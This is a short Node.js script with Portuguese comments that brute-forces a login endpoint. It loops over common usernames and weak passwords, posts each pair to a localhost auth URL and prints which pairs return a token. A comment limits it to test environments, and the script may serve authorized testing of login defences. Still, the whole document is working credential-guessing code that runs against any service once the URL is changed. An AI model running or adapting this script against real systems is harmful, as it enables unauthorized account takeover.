// Script de brute force simples para endpoint de login
// ATENÇÃO: Use apenas em ambiente de teste!
const axios = require('axios');

const url = 'http://localhost:3000/auth/login'; // ajuste conforme necessário
const usernames = ['admin', 'user', 'test'];
const passwords = ['123456', 'password', 'admin', 'senha123'];

(async () => {
    for (const username of usernames) {
        for (const password of passwords) {
            try {
                const response = await axios.post(url, { username, password });
                if (response.status === 200 && response.data.token) {
                    console.log(`SUCESSO: ${username} / ${password}`);
                } else {
                    console.log(`FALHA: ${username} / ${password}`);
                }
            } catch (err) {
                console.log(`FALHA: ${username} / ${password}`);
            }
        }
    }
})();
